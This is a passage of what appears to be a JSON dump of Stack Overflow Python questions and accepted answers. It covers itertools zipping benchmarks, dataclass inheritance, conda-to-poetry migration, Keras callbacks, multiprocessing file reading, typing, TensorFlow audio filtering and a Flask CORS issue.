    "Body": "I know about the zip function (which will zip according to the shortest list) and zip_longest (which will zip according to the longest list), but how would I zip according to the first list, regardless of whether it's the longest or not?\nFor example:\nInput:  ['a', 'b', 'c'], [1, 2]\nOutput: [('a', 1), ('b', 2), ('c', None)]\n\nBut also:\nInput:  ['a', 'b'], [1, 2, 3]\nOutput: [('a', 1), ('b', 2)]\n\nDo both of these functionalities exist in one function?\n",
    "AcceptedAnswerId": 71520401,
    "AcceptedAnswer": "Solutions\nChaining the repeated fillvalue behind the iterables other than the first:\nfrom itertools import chain, repeat\n\ndef zip_first(first, *rest, fillvalue=None):\n    return zip(first, *map(chain, rest, repeat(repeat(fillvalue))))\n\nOr using zip_longest and trim it with a compress and zip trick:\ndef zip_first(first, *rest, fillvalue=None):\n    a, b = tee(first)\n    return compress(zip_longest(b, *rest, fillvalue=fillvalue), zip(a))\n\nJust like zip and zip_longest, these take any number (well, at least one) of any kind of iterables (including infinite ones) and return an iterator (convert to list if needed).\nBenchmark results\nBenchmarks with other equally general solutions (all code is at the end of the answer):\n10 iterables of 10,000 to 90,000 elements, first has 50,000:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n 2.2 ms   2.2 ms   2.3 ms  limit_cheat\n 2.6 ms   2.6 ms   2.6 ms  Kelly_Bundy_chain\n 3.3 ms   3.3 ms   3.3 ms  Kelly_Bundy_compress\n50.2 ms  50.6 ms  50.7 ms  CrazyChucky\n54.7 ms  55.0 ms  55.0 ms  Sven_Marnach\n74.8 ms  74.9 ms  75.0 ms  Mad_Physicist\n 5.4 ms   5.4 ms   5.4 ms  Kelly_Bundy_3\n 5.9 ms   6.0 ms   6.0 ms  Kelly_Bundy_4\n 4.6 ms   4.7 ms   4.7 ms  Kelly_Bundy_5\n\n10,000 iterables of 0 to 100 elements, first has 50:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n 4.6 ms   4.7 ms   4.8 ms  limit_cheat\n 4.8 ms   4.8 ms   4.8 ms  Kelly_Bundy_compress\n 8.4 ms   8.4 ms   8.4 ms  Kelly_Bundy_chain\n27.1 ms  27.3 ms  27.5 ms  CrazyChucky\n38.3 ms  38.5 ms  38.7 ms  Sven_Marnach\n73.0 ms  73.0 ms  73.1 ms  Mad_Physicist\n 4.9 ms   4.9 ms   5.0 ms  Kelly_Bundy_3\n 4.9 ms   4.9 ms   5.0 ms  Kelly_Bundy_4\n 5.0 ms   5.0 ms   5.0 ms  Kelly_Bundy_5\n\n\nThe first one is a cheat that knows the length, included to show what's probably a limit for how fast we can get.\nExplanations\nA little explanation of the above two solutions:\nThe first solution, if used with for example three iterables, is equivalent to this:\ndef zip_first(first, second, third, fillvalue=None):\n    filler = repeat(fillvalue)\n    return zip(first,\n               chain(second, filler),\n               chain(third, filler))\n\nThe second solution basically lets zip_longest do the job. The only problem with that is that it doesn't stop when the first iterable is done. So I duplicate the first iterable (with tee) and then use one for its elements and the other for its length. The zip(a) wraps every element in a 1-tuple, and non-empty tuples are true. So compress gives me all tuples produced by zip_longest, as many as there are elements in the first iterable.\nBenchmark code (Try it online!)\ndef limit_cheat(*iterables, fillvalue=None):\n    return islice(zip_longest(*iterables, fillvalue=fillvalue), cheat_length)\n\ndef Kelly_Bundy_chain(first, *rest, fillvalue=None):\n    return zip(first, *map(chain, rest, repeat(repeat(fillvalue))))\n\ndef Kelly_Bundy_compress(first, *rest, fillvalue=None):\n    a, b = tee(first)\n    return compress(zip_longest(b, *rest, fillvalue=fillvalue), zip(a))\n\ndef CrazyChucky(*iterables, fillvalue=None):\n    SENTINEL = object()\n    \n    for first, *others in zip_longest(*iterables, fillvalue=SENTINEL):\n        if first is SENTINEL:\n            return\n        others = [i if i is not SENTINEL else fillvalue for i in others]\n        yield (first, *others)\n\ndef Sven_Marnach(first, *rest, fillvalue=None):\n    rest = [iter(r) for r in rest]\n    for x in first:\n        yield x, *(next(r, fillvalue) for r in rest)\n\ndef Mad_Physicist(*args, fillvalue=None):\n    # zip_by_first('ABCD', 'xy', fillvalue='-') --> Ax By C- D-\n    # zip_by_first('ABC', 'xyzw', fillvalue='-') --> Ax By Cz\n    if not args:\n        return\n    iterators = [iter(it) for it in args]\n    while True:\n        values = []\n        for i, it in enumerate(iterators):\n            try:\n                value = next(it)\n            except StopIteration:\n                if i == 0:\n                    return\n                iterators[i] = repeat(fillvalue)\n                value = fillvalue\n            values.append(value)\n        yield tuple(values)\n\ndef Kelly_Bundy_3(first, *rest, fillvalue=None):\n    a, b = tee(first)\n    return map(itemgetter(1), zip(a, zip_longest(b, *rest, fillvalue=fillvalue)))\n\ndef Kelly_Bundy_4(first, *rest, fillvalue=None):\n    sentinel = object()\n    for z in zip_longest(chain(first, [sentinel]), *rest, fillvalue=fillvalue):\n        if z[0] is sentinel:\n            break\n        yield z\n\ndef Kelly_Bundy_5(first, *rest, fillvalue=None):\n    stopped = False\n    def stop():\n        nonlocal stopped\n        stopped = True\n        return\n        yield\n    for z in zip_longest(chain(first, stop()), *rest, fillvalue=fillvalue):\n        if stopped:\n            break\n        yield z\n\n\nimport timeit\nfrom itertools import chain, repeat, zip_longest, islice, tee, compress\nfrom operator import itemgetter\nfrom collections import deque\n\nfuncs = [\n    limit_cheat,\n    Kelly_Bundy_chain,\n    Kelly_Bundy_compress,\n    CrazyChucky,\n    Sven_Marnach,\n    Mad_Physicist,\n    Kelly_Bundy_3,\n    Kelly_Bundy_4,\n    Kelly_Bundy_5,\n]\n\ndef test(args_creator):\n\n    # Correctness\n    expect = list(funcs[0](*args_creator()))\n    for func in funcs:\n        result = list(func(*args_creator()))\n        print(result == expect, func.__name__)\n    \n    # Speed\n    tss = [[] for _ in funcs]\n    for _ in range(5):\n        print()\n        print(args_creator.__name__)\n        for func, ts in zip(funcs, tss):\n            t = min(timeit.repeat(lambda: deque(func(*args_creator()), 0), number=1))\n            ts.append(t)\n            print(*('%4.1f ms ' % (t * 1e3) for t in sorted(ts)[:3]), func.__name__)\n\ndef args_few_but_long_iterables():\n    global cheat_length\n    cheat_length = 50_000\n    first = repeat(0, 50_000)\n    rest = [repeat(i, 10_000 * i) for i in range(1, 10)]\n    return first, *rest\n\ndef args_many_but_short_iterables():\n    global cheat_length\n    cheat_length = 50\n    first = repeat(0, 50)\n    rest = [repeat(i, i % 101) for i in range(1, 10_000)]\n    return first, *rest\n\ntest(args_few_but_long_iterables)\nfuncs[1:3] = funcs[1:3][::-1]\ntest(args_many_but_short_iterables)\n\n"
}
{
    "Id": 72472220,
    "PostTypeId": 1,
    "Title": "dataclass inheritance: Fields without default values cannot appear after fields with default values",
    "Body": "Context\nI created two data classes to handle table metadata. TableMetadata apply to any kind of tables, while RestTableMetadata contains information relevant for data extracted from REST apis\n@dataclass\nclass TableMetadata:\n    \"\"\"\n    - entity: business entity represented by the table\n    - origin: path / query / url from which data withdrawn\n    - id: field to be used as ID (unique)\n    - historicity: full, delta\n    - upload: should the table be uploaded\n    \"\"\"\n\n    entity: str\n    origin: str\n    view: str\n    id: str = None\n    historicity: str = \"full\"\n    upload: bool = True\n    columns: list = field(default_factory=list)\n\n\n@dataclass\nclass RestTableMetadata(TableMetadata):\n    \"\"\"\n    - method: HTTP method to be used\n    - payloadpath: portion of the response payload to use to build the dataframe\n    \"\"\"\n\n    method: str\n    payloadpath: str = None\n\nProblem\nBecause of inheritance, method (without default values) comes after columns, resulting in the following Pylance error: Fields without default values cannot appear after fields with default values\nI'm looking for a way to fix it without overriding __init__ (if there is such a way). I also noticed a method called __init_subclass__ (This method is called when a class is subclassed.) that might affect how RestTableMetadata.__init__ and other subclasses is generated.\n",
    "AcceptedAnswerId": 72715549,
    "AcceptedAnswer": "Here is a working solution for python > 3.10\n@dataclass(kw_only=True)\nclass TableMetadata:\n    \"\"\"\n    - entity: business entity represented by the table\n    - origin: path / query / url from which data withdrawn\n    - id: field to be used as ID (unique)\n    - historicity: full, delta\n    - upload: should the table be uploaded\n    \"\"\"\n\n    entity: str\n    origin: str\n    view: str\n    id: str = None\n    historicity: str = \"full\"\n    upload: bool = True\n    columns: list = field(default_factory=list)\n\n\n@dataclass(kw_only=True)\nclass RestTableMetadata(TableMetadata):\n    \"\"\"\n    - method: HTTP method to be used\n    - payloadpath: portion of the response payload to use to build the dataframe\n    \"\"\"\n\n    method: str\n    payloadpath: str = None\n\n"
}
{
    "Id": 72202728,
    "PostTypeId": 1,
    "Title": "Conda to poetry environment",
    "Body": "I have a conda environment that I would like to convert to a poetry environment.\nWhat I have tried is to translate the environment.yaml of the conda environment into a pyproject.toml file that poetry can read. Here you have the steps:\n\nGenerate the yaml file\nconda env export --from-history > environment.yaml\nThe --from-history flag includes only the packages that I explicitly asked for. Here it is how the file looks like after installing numpy.\n# environment.yaml\n\nname: C:\\Users\\EDOCIC\\Screepts\\My_projects\\Tests\\conda2poetry\\condaenv\nchannels:\n  - defaults\ndependencies:\n  - numpy\n\n\nManually create the pyproject.toml file out of environment.yaml. I added the numpy version, which I got from conda env export. Here it is the result:\n# pyproject.toml\n\n[tool.poetry]\nname = \"conda2poetry\"\nversion = \"0.1.0\"\ndescription = \"\"\nauthors = [\"\"]\n\n[tool.poetry.dependencies]\npython = \"~3.7\"\nnumpy = \"^1.21.5\"\n\n[tool.poetry.dev-dependencies]\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\n\nCreate the environment with poetry init, which will automatically read the toml file.\n\n\nThe process seems to work but it's quite manual and prone to mistakes.\nIs there a better way?\n",
    "AcceptedAnswerId": 72204094,
    "AcceptedAnswer": "No, there is not a better way. Conda is a generic package manager and does not discern Python versus non-Python packages, therefore this has to be done with manual curation.\nAdditionally, package names might also differ. For example py-opencv(conda-forge) vs opencv-python (PyPi).\nTips\nIn addition to pulling down the --from-history YAML, it may also help to dump out a pip list --format=freeze. This could help with resolving any tricky packages that use different names in Conda versus PyPI.\nIf the environment uses any PyPI packages directly, this won't be seen from a conda env export --from-history. However, these will appear when using conda list (entries with channel pypi) or plain conda env export, which would have a dependencies.pip: section if there are any.\n"
}
{
    "Id": 71412499,
    "PostTypeId": 1,
    "Title": "How to prevent Keras from computing metrics during training",
    "Body": "I'm using Tensorflow/Keras 2.4.1 and I have a (unsupervised) custom metric that takes several of my model inputs as parameters such as:\nmodel = build_model() # returns a tf.keras.Model object\nmy_metric = custom_metric(model.output, model.input[0], model.input[1])\nmodel.add_metric(my_metric)\n[...]\nmodel.fit([...]) # training with fit\n\nHowever, it happens that custom_metric is very expensive so I would like it to be computed during validation only. I found this answer but I hardly understand how I can adapt the solution to my metric that uses several model inputs as parameter since the update_state method doesn't seem flexible.\nIn my context, is there a way to avoid computing my metric during training, aside from writing my own training loop ?\nAlso, I am very surprised we cannot natively specify to Tensorflow that some metrics should only be computed at validation time, is there a reason for that ?\nIn addition, since the model is trained to optimize the loss, and that the training dataset should not be used to evaluate a model, I don't even understand why, by default, Tensorflow computes metrics during training.\n",
    "AcceptedAnswerId": 71564427,
    "AcceptedAnswer": "I think that the simplest solution to compute a metric only on the validation is using a custom callback.\nhere we define our dummy callback:\nclass MyCustomMetricCallback(tf.keras.callbacks.Callback):\n\n    def __init__(self, train=None, validation=None):\n        super(MyCustomMetricCallback, self).__init__()\n        self.train = train\n        self.validation = validation\n\n    def on_epoch_end(self, epoch, logs={}):\n\n        mse = tf.keras.losses.mean_squared_error\n\n        if self.train:\n            logs['my_metric_train'] = float('inf')\n            X_train, y_train = self.train[0], self.train[1]\n            y_pred = self.model.predict(X_train)\n            score = mse(y_train, y_pred)\n            logs['my_metric_train'] = np.round(score, 5)\n\n        if self.validation:\n            logs['my_metric_val'] = float('inf')\n            X_valid, y_valid = self.validation[0], self.validation[1]\n            y_pred = self.model.predict(X_valid)\n            val_score = mse(y_pred, y_valid)\n            logs['my_metric_val'] = np.round(val_score, 5)\n\nGiven this dummy model:\ndef build_model():\n\n  inp1 = Input((5,))\n  inp2 = Input((5,))\n  out = Concatenate()([inp1, inp2])\n  out = Dense(1)(out)\n\n  model = Model([inp1, inp2], out)\n  model.compile(loss='mse', optimizer='adam')\n\n  return model\n\nand this data:\nX_train1 = np.random.uniform(0,1, (100,5))\nX_train2 = np.random.uniform(0,1, (100,5))\ny_train = np.random.uniform(0,1, (100,1))\n\nX_val1 = np.random.uniform(0,1, (100,5))\nX_val2 = np.random.uniform(0,1, (100,5))\ny_val = np.random.uniform(0,1, (100,1))\n\nyou can use the custom callback to compute the metric both on train and validation:\nmodel = build_model()\n\nmodel.fit([X_train1, X_train2], y_train, epochs=10, \n          callbacks=[MyCustomMetricCallback(train=([X_train1, X_train2],y_train), validation=([X_val1, X_val2],y_val))])\n\nonly on validation:\nmodel = build_model()\n\nmodel.fit([X_train1, X_train2], y_train, epochs=10, \n          callbacks=[MyCustomMetricCallback(validation=([X_val1, X_val2],y_val))])\n\nonly on train:\nmodel = build_model()\n\nmodel.fit([X_train1, X_train2], y_train, epochs=10, \n          callbacks=[MyCustomMetricCallback(train=([X_train1, X_train2],y_train))])\n\nremember only that the callback evaluates the metrics one-shot on the data, like any metric/loss computed by default by keras on the validation_data.\nhere is the running code.\n"
}
{
    "Id": 71791008,
    "PostTypeId": 1,
    "Title": "np.cumsum(df['column']) treatment of nans",
    "Body": "np.cumsum([1, 2, 3, np.nan, 4, 5, 6]) will return nan for every value after the first np.nan. Moreover, it will do the same for any generator. However, np.cumsum(df['column']) will not. What does np.cumsum(...) do, such that dataframes are treated specially?\nIn [2]: df = pd.DataFrame({'column': [1, 2, 3, np.nan, 4, 5, 6]})\n\nIn [3]: np.cumsum(df['column'])\nOut[3]: \n0     1.0\n1     3.0\n2     6.0\n3     NaN\n4    10.0\n5    15.0\n6    21.0\nName: column, dtype: float64\n\n",
    "AcceptedAnswerId": 71791193,
    "AcceptedAnswer": "When you call np.cumsum(object) with an object that is not a numpy array, it will try calling object.cumsum() See this thread for details\n. You can also see it in the Numpy source.\nThe pandas method has a default of skipna=True. So np.cumsum(df) gets turned into the equivalent of df.cumsum(axis=None, skipna=True, *args, **kwargs), which, of course skips the NaN values. The Numpy method does not have a skipna option.\nYou can also verify this yourself by overriding the pandas method with your own:\nclass DF(pd.DataFrame):\n    def cumsum(self, axis=None, skipna=True, *args, **kwargs):\n        print('calling pandas cumsum')\n        return super().cumsum(axis=None, skipna=True, *args, **kwargs)\n\ndf = DF({'column': [1, 2, 3, np.nan, 4, 5, 6]})\n\n# does calling the numpy function call your pandas method?   \nnp.cumsum(df)\n\nThis will print\ncalling pandas cumsum\n\nand return the expected result:\n    column\n0   1.0\n1   3.0\n2   6.0\n3   NaN\n4   10.0\n5   15.0\n6   21.0\n\nYou can then experiment with the result of changing skipna=True.\n"
}
{
    "Id": 71580859,
    "PostTypeId": 1,
    "Title": "ImportError when importing psycopg2 on M1",
    "Body": "Has anyone gotten this error when importing psycopg2 after successful installation?\nImportError: dlopen(/Users/chrishicks/Desktop/test/venv/lib/python3.9/site-packages/psycopg2/_psycopg.cpython-39-darwin.so, 0x0002):\ntried: '/Users/chrishicks/Desktop/test/venv/lib/python3.9/site-packages/psycopg2/_psycopg.cpython-39-darwin.so'\n(mach-o file, but is an incompatible architecture\n(have 'x86_64', need 'arm64e')),\n'/usr/local/lib/_psycopg.cpython-39-darwin.so' (no such file),\n'/usr/lib/_psycopg.cpython-39-darwin.so' (no such file)\n\nI have tried installing psycopg2 and psycopg2-binary and have tried both while running iTerm in Rosetta.\n",
    "AcceptedAnswerId": 71581113,
    "AcceptedAnswer": "Using this line should fix it:\npip3.9 install psycopg2-binary --force-reinstall --no-cache-dir\n\n"
}
{
    "Id": 71803409,
    "PostTypeId": 1,
    "Title": "VSCode: how to interrupt a running Python test?",
    "Body": "I'm using VSCode Test Explorer to run my Python unit tests. There was a bug in my code and my tested method never finishes.\nHow do I interrupt my test? I can't find how to do it using the GUI. I had to close VSCode to interrupt it.\nI'm using pytest framework.\n",
    "AcceptedAnswerId": 71803605,
    "AcceptedAnswer": "Silly me, here is the Stop button at the top right of the the Testing tab:\n\n"
}
{
    "Id": 71630563,
    "PostTypeId": 1,
    "Title": "Syntax for making objects callable in python",
    "Body": "I understand that in python user-defined objects can be made callable by defining a __call__() method in the class definition. For example,\nclass MyClass:\n  def __init__(self):\n    pass\n\n  def __call__(self, input1):\n    self.my_function(input1)\n\n  def my_function(self, input1):\n    print(f\"MyClass - print {input1}\")\n\nmy_obj = MyClass()\n# same as calling my_obj.my_function(\"haha\")\nmy_obj(\"haha\") # prints \"MyClass - print haha\"\n\nI was looking at how pytorch makes the forward() method of a nn.Module object be called implicitly when the object is called and saw some syntax I didn't understand.\nIn the line that supposedly defines the __call__ method the syntax used is,\n__call__ : Callable[..., Any] = _call_impl\n\nThis seemed like a combination of an annotation (keyword Callable[ following : ignored by python) and a value of _call_impl which we want to be called when __call__ is invoked, and my guess is that this is a shorthand for,\ndef __call__(self, *args, **kwargs):\n    return self._call_impl(*args, **kwargs)\n\nbut wanted to understand clearly how this method of defining functions worked.\nMy question is: When would we want to use such a definition of callable attributes of a class instead of the usual def myfunc(self, *args, **kwargs)\n",
    "AcceptedAnswerId": 71630606,
    "AcceptedAnswer": "Functions are normal first-class objects in python. The name to with which you define a function object, e.g. with a def statement, is not set in stone, any more than it would be for an int or list. Just as you can do\na = [1, 2, 3]\nb = a\n\nto access the elements of a through the name b, you can do the same with functions. In your first example, you could replace\ndef __call__(self, input1):\n    self.my_function(input1)\n\nwith the much simpler\n__call__ = my_function\n\nYou would need to put this line after the definition of my_function.\nThe key differences between the two implementations is that def __call__(... creates a new function. __call__ = ... simply binds the name __call__ to the same object as my_function. The noticeable difference is that if you do __call__.__name__, the first version will show __call__, while the second will show my_function, since that's what gets assigned by a def statement.\n"
}
{
    "Id": 71823279,
    "PostTypeId": 1,
    "Title": "Python Read huge file line per line and send it to multiprocessing or thread",
    "Body": "I have been trying to get my code to work for many days,\nI am desperate.\nI've scoured the internet, but I still can't find it.\nI have a text file encoded in \"latin-1\" of 9GB -> 737 022 387 lines, each line contains a string.\nI would like to read each line and send them in an http PUT request that waits for a response, and returns TRUE or FALSE if the response is 200 or 400\nThe PUT request takes about 1 to 3 seconds, so to speed up the processing time I would like to use either a Thread or a multiprocessing.\nTo start, I simulate my PUT request with a sleep of 3 seconds.\nand even that I can't get it to work\nThis code split my string into char, i don't know why...\nfrom multiprocessing import Pool\nfrom time import sleep\n\n\ndef process_line(line):\n   sleep(3)\n   print(line)\n   return True\n\nif __name__ == \"__main__\":\n    pool = Pool(2)\n    peon =  open(r'D:\\txtFile',encoding=\"latin-1\")\n    for line in peon:\n        res = pool.map(process_line,line )\n        print(res)\n\nThis give error : TypeError: process_line() takes 1 positional argument but 17 were given\nimport multiprocessing\nfrom multiprocessing import Pool\nfrom time import sleep\n\n\ndef process_line(line):\n   sleep(3)\n   print(line)\n   return True\n\nif __name__ == \"__main__\":\n    pool = Pool(2)\n    with open(r\"d:\\txtFile\",encoding=\"latin-1\") as file:\n        res = pool.apply(process_line,file.readline() )\n        print(res)\n\nthat : Crash the computer\nfrom multiprocessing import Pool\nfrom time import sleep\n\n\ndef process_line(line):\n   sleep(3)\n   print(line)\n   return True\n\nif __name__ == \"__main__\":\n    pool = Pool(2)\n    peon =  open(r'D:\\txtFile',encoding=\"latin-1\")\n    for line in peon:\n        res = pool.map(process_line,peon )\n        print(res)\n\n",
    "AcceptedAnswerId": 71824107,
    "AcceptedAnswer": "Although the problem seems unrealistic though. shooting 737,022,387 requests! calculate how many months it'll take from single computer!!\nStill, Better way to do this task is to read line by line from file in a separate thread and insert into a queue. And then multi-process the queue.\nSolution 1:\nfrom multiprocessing import Queue, Process\nfrom threading import Thread\nfrom time import sleep\n\nurls_queue = Queue()\nmax_process = 4\n\ndef read_urls():\n    with open('urls_file.txt', 'r') as f:\n        for url in f:\n            urls_queue.put(url.strip())\n            print('put url: {}'.format(url.strip()))\n\n    # put DONE to tell send_request_processor to exit\n    for i in range(max_process):\n        urls_queue.put(\"DONE\")\n\n\ndef send_request(url):\n    print('send request: {}'.format(url))\n    sleep(1)\n    print('recv response: {}'.format(url))\n\n\ndef send_request_processor():\n    print('start send request processor')\n    while True:\n        url = urls_queue.get()\n        if url == \"DONE\":\n            break\n        else:\n            send_request(url)\n\n\ndef main():\n    file_reader_thread = Thread(target=read_urls)\n    file_reader_thread.start()\n\n    procs = []\n    for i in range(max_process):\n        p = Process(target=send_request_processor)\n        procs.append(p)\n        p.start()\n\n    for p in procs:\n        p.join()\n\n    print('all done')\n    # wait for all tasks in the queue\n    file_reader_thread.join()\n\n\nif __name__ == '__main__':\n    main()\n\nDemo: https://onlinegdb.com/Elfo5bGFz\nSolution 2:\nYou can use tornado asynchronous networking library\nfrom tornado import gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.queues import Queue\n\nq = Queue(maxsize=2)\n\nasync def consumer():\n    async for item in q:\n        try:\n            print('Doing work on %s' % item)\n            await gen.sleep(0.01)\n        finally:\n            q.task_done()\n\nasync def producer():\n    with open('urls_file.txt', 'r') as f:\n        for url in f:\n            await q.put(url)\n            print('Put %s' % item)\n\nasync def main():\n    # Start consumer without waiting (since it never finishes).\n    IOLoop.current().spawn_callback(consumer)\n    await producer()     # Wait for producer to put all tasks.\n    await q.join()       # Wait for consumer to finish all tasks.\n    print('Done')\n    # producer and consumer can run in parallel\n\nIOLoop.current().run_sync(main)\n\n"
}
{
    "Id": 71655179,
    "PostTypeId": 1,
    "Title": "How can I make an object with an interface like a random number generator, but that actually generates a specified sequence?",
    "Body": "I'd like to construct an object that works like a random number generator, but generates numbers in a specified sequence.\n# a random number generator\nrng = lambda : np.random.randint(2,20)//2\n\n# a non-random number generator\ndef nrng():\n    numbers = np.arange(1,10.5,0.5)\n    for i in range(len(numbers)):\n        yield numbers[i]\n\nfor j in range(10):\n    print('random number', rng())\n    print('non-random number', nrng())\n\nThe issue with the code above that I cannot call nrng in the last line because it is a generator. I know that the most straightforward way to rewrite the code above is to simply loop over the non-random numbers instead of defining the generator. I would prefer getting the example above to work because I am working with a large chunk of code that include a function that accepts a random number generator as an argument, and I would like to add the functionality to pass non-random number sequences without rewriting the entire code.\nEDIT: I see some confusion in the comments. I am aware that python's random number generators generate pseudo-random numbers. This post is about replacing a pseudo-random-number generator by a number generator that generates numbers from a non-random, user-specified sequence (e.g., a generator that generates the number sequence 1,1,2,2,1,0,1 if I want it to).\n",
    "AcceptedAnswerId": 71655539,
    "AcceptedAnswer": "Edit:\nThe cleanest way to do this would be to use a lambda to wrap your call to next(nrng) as per great comment from @GACy20:\ndef nrng_gen():\n    yield from range(10)\n\nnrng = nrng_gen()\n\nnrng_func = lambda: next(nrng)\n\nfor i in range(10):\n    print(nrng_func())\n\nOriginal answer:\nIf you want your object to keep state and look like a function, create a custom class with __call__ method.\neg.\nclass NRNG:\n    def __init__(self):\n        self.numbers = range(10)\n        self.state = -1\n    def __call__(self):\n        self.state += 1\n        return self.numbers[self.state]\n        \nnrng = NRNG()\n\n\nfor i in range(10):\n    print(nrng())\n\nHowever, I wouldn't recommend this unless absolutely necessary, as it obscures the fact that your nrng keeps a state (although technically, most rngs keep their state internally).\nIt's best to just use a regular generator with yield by calling next on it or to write a custom iterator (also class-based). Those will work with things like for loops and other python tools for iteration (like the excellent itertools package).\n"
}
{
    "Id": 71656644,
    "PostTypeId": 1,
    "Title": "Python type hint for Iterable[str] that isn't str",
    "Body": "In Python, is there a way to distinguish between strings and other iterables of strings?\nA str is valid as an Iterable[str] type, but that may not be the correct input for a function. For example, in this trivial example that is intended to operate on sequences of filenames:\nfrom typing import Iterable\n\ndef operate_on_files(file_paths: Iterable[str]) -> None:\n    for path in file_paths:\n        ...\n\nPassing in a single filename would produce the wrong result but would not be caught by type checking. I know that I can check for string or byte types at runtime, but I want to know if it's possible to catch silly mistakes like that with a type-checking tool.\nI've looked over the collections.abc module and there doesn't seem to be any abc that would include typical iterables (e.g. lists, tuples) but exclude strings. Similarly, for the typing module, there doesn't seem to be a type for iterables that don't include strings.\n",
    "AcceptedAnswerId": 71657094,
    "AcceptedAnswer": "As of March 2022, the answer is no.\nThis issue has been discussed since at least July 2016. On a proposal to distinguish between str and Iterable[str], Guido van Rossum writes:\n\nSince str is a valid iterable of str this is tricky. Various proposals have been made but they don't fit easily in the type system.\n\nYou'll need to list out all of the types that you want your functions to accept explicitly, using Union (pre-3.10) or | (3.10 and higher).\ne.g. For pre-3.10, use:\nfrom typing import Union\n## Heading ##\ndef operate_on_files(file_paths: Union[TypeOneName, TypeTwoName, etc.]) -> None:\n    for path in file_paths:\n        ...\n\nFor 3.10 and higher, use:\n## Heading ##\ndef operate_on_files(file_paths: TypeOneName | TypeTwoName | etc.) -> None:\n    for path in file_paths:\n        ...\n\nIf you happen to be using Pytype, it will not treat str as an Iterable[str] (as pointed out by Kelly Bundy). But, this behavior is typechecker-specific, and isn't widely supported in other typecheckers.\n"
}
{
    "Id": 71828861,
    "PostTypeId": 1,
    "Title": "Filtering audio signal in TensorFlow",
    "Body": "I am building an audio-based deep learning model. As part of the preporcessing I want to augment the audio in my datasets. One augmentation that I want to do is to apply RIR (room impulse response) function. I am working with Python 3.9.5 and TensorFlow 2.8.\nIn Python the standard way to do it is, if the RIR is given as a finite impulse response (FIR) of n taps, is using SciPy lfilter\nimport numpy as np\nfrom scipy import signal\nimport soundfile as sf\n\nh = np.load(\"rir.npy\")\nx, fs = sf.read(\"audio.wav\")\n\ny = signal.lfilter(h, 1, x)\n\nRunning in loop on all the files may take a long time. Doing it with TensorFlow map utility on TensorFlow datasets:\n# define filter function\ndef h_filt(audio, label):\n    h = np.load(\"rir.npy\")\n    x = audio.numpy()\n    y = signal.lfilter(h, 1, x)\n    return tf.convert_to_tensor(y, dtype=tf.float32), label\n\n# apply it via TF map on dataset\naug_ds = ds.map(h_filt)\n\nUsing tf.numpy_function:\ntf_h_filt = tf.numpy_function(h_filt, [audio, label], [tf.float32, tf.string])\n\n# apply it via TF map on dataset\naug_ds = ds.map(tf_h_filt)\n\nI have two questions:\n\nIs this way correct and fast enough (less than a minute for 50,000 files)?\nIs there a faster way to do it? E.g. replace the SciPy function with a built-in TensforFlow function. I didn't find the equivalent of lfilter or SciPy's convolve.\n\n",
    "AcceptedAnswerId": 71838022,
    "AcceptedAnswer": "Here is one way you could do\nNotice that tensor flow function is designed to receive batches of inputs with multiple channels, and the filter can have multiple input channels and multiple output channels. Let N be the size of the batch I, the number of input channels, F the filter width, L the input width and O  the number of output channels. Using padding='SAME' it maps an input of shape (N, L, I) and a filter of shape (F, I, O) to an output of shape (N, L, O).\nimport numpy as np\nfrom scipy import signal\nimport tensorflow as tf\n\n# data to compare the two approaches\nx = np.random.randn(100)\nh = np.random.randn(11)\n\n# h\ny_lfilt = signal.lfilter(h, 1, x)\n\n# Since the denominator of your filter transfer function is 1\n# the output of lfiler matches the convolution\ny_np = np.convolve(h, x)\nassert np.allclose(y_lfilt, y_np[:len(y_lfilt)])\n\n# now let's do the convolution using tensorflow\ny_tf = tf.nn.conv1d(\n    # x must be padded with half of the size of h\n    # to use padding 'SAME'\n    np.pad(x, len(h) // 2).reshape(1, -1, 1), \n    # the time axis of h must be flipped\n    h[::-1].reshape(-1, 1, 1), # a 1x1 matrix of filters\n    stride=1, \n    padding='SAME', \n    data_format='NWC')\n\nassert np.allclose(y_lfilt, np.squeeze(y_tf)[:len(y_lfilt)])\n\n"
}
{
    "Id": 71818149,
    "PostTypeId": 1,
    "Title": "POST request gets blocked on Python backend. GET request works fine",
    "Body": "I am building a web app where the front-end is done with Flutter while the back-end is with Python.\nGET requests work fine while POST requests get blocked because of CORS, I get this error message:\nAccess to XMLHttpRequest at 'http://127.0.0.1:8080/signal' from origin 'http://localhost:57765' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.\n\nBelow is my flutter function I used to send GET and POST requests:\n  Future sendResponse() async {\n    final url = 'http://127.0.0.1:8080/signal';\n    var data = {\n      \"signal\": '8',\n    };\n    var header = {\n      'Access-Control-Allow-Origin': '*',\n      \"Accept\": \"application/x-www-form-urlencoded, '*'\"\n    };\n\n\n    http.Response response = await http.post(Uri.parse(url), body: data, headers: header);//http.post(Uri.parse(url), body: data, headers: header);//http.get(Uri.parse(url));\n    if (response.statusCode == 200) {\n      print(json.decode(response.body));\n      return jsonDecode(response.body);\n      //print(json.decode(credentials.body));\n    } else {\n      print(response.statusCode);\n      throw Exception('Failed to load Entry');\n    }\n\n   // var ResponseFromPython = await response.body;//jsonDecode(credentials.body);\n\n   // return ResponseFromPython;\n  }\n\nBelow is my Python backend code using Flask:\n   from flask import Flask,jsonify, request, make_response\n   import json\n\n\n   from flask_cors import CORS, cross_origin\n\n\n   #declared an empty variable for reassignment\n   response = ''\n\n   app = Flask(__name__)\n\n   #CORS(app, resources={r\"/signal\": {\"origins\": \"*, http://localhost:59001\"}}) \n   #http://localhost:52857\n   #CORS(app, origins=['*'])\n   